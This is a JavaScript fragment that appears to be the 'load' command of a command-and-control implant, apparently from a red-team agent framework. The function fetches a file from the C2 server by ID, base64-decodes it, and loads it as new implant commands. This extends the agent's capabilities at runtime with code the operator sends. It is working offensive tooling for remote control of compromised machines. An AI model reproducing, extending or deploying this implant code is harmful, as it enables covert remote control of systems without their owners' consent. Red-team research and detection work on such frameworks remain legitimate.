exports.load = function(task, command, params){
    //base64 decode the params and pass it to the default_load command
    //  params should be {"cmds": ["cmd_name1", "cmd_name2"], "file_id": #}
    try{
        let parsed_params = JSON.parse(params);
        let code = C2.upload(task, parsed_params['file_id']);
        if(typeof code === "string"){
            return JSON.stringify({"user_output":String(code), "completed": true, "status": "error"});
            //something failed, we should have NSData type back
        }
        let new_dict = default_load(base64_decode(code));
        commands_dict = Object.assign({}, commands_dict, new_dict);
        // update the config with our new information
        C2.commands = Object.keys(commands_dict);
        return JSON.stringify({"user_output": "Loaded " + parsed_params['cmds'], "completed": true});
    }
    catch(error){
        //console.log("errored in load function");
        return JSON.stringify({"user_output":error.toString(), "completed": true, "status": "error"});
    }
};
COMMAND_ENDS_HERE